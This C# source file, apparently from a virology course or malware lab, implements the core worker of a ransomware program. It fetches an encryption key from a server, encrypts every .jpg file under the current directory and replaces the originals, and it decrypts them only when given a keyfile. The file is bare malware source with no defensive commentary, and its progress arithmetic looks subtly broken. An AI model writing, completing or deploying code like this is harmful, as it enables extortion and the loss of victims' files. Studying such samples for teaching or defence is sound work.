using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.IO;

namespace Virologie
{
    public enum EncryptError
    {
        ServerNotFound,
        Other,
    }

    class EncryptWorker : BackgroundWorker
    {
        private readonly string _keyfile;
        private readonly bool _decrypt;
        public EncryptError ErrorType { get; private set; }

        private string _fileBuf1 = "";
        private string _fileBuf2 = "";
        private bool _switchFiles = false;
        public string CurrentFile
        {
            get
            {
                return _switchFiles ? _fileBuf1 : _fileBuf2;
            }
            private set
            {
                if (_switchFiles)
                    _fileBuf2 = value;
                else
                    _fileBuf1 = value;
            }
        }

        public void SwitchFiles()
        {
            _switchFiles = !_switchFiles;
        }

        public EncryptWorker(String keyfile = null)
        {
            _keyfile = keyfile;
            DoWork += worker_DoWork;
            WorkerReportsProgress = true;
        }

        void worker_DoWork(object sender, DoWorkEventArgs args)
        {
            var explorer = new FileExplorer();
            FileEncrypter encrypter = (_keyfile == null)
                ? CryptoKeyManager.CreateFromServer("http://localhost:1234/") 
                : CryptoKeyManager.CreateFromFile(_keyfile);

            if (encrypter != null)
            {
                var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
                int count = 1;
                var enumerable = files as IList<string> ?? files.ToList();
                CryptoKeyManager.SaveGUID();
                foreach (var file in enumerable)
                {
                    ReportProgress(100 * count++ / (100 * enumerable.Count()));
                    CurrentFile = file;
                    SwitchFiles();

                    if (_keyfile != null)
                        encrypter.Decrypt(file);
                    else
                        encrypter.Encrypt(file);

                    explorer.ReplaceFile(file);
                }
            }
        }
    }
}
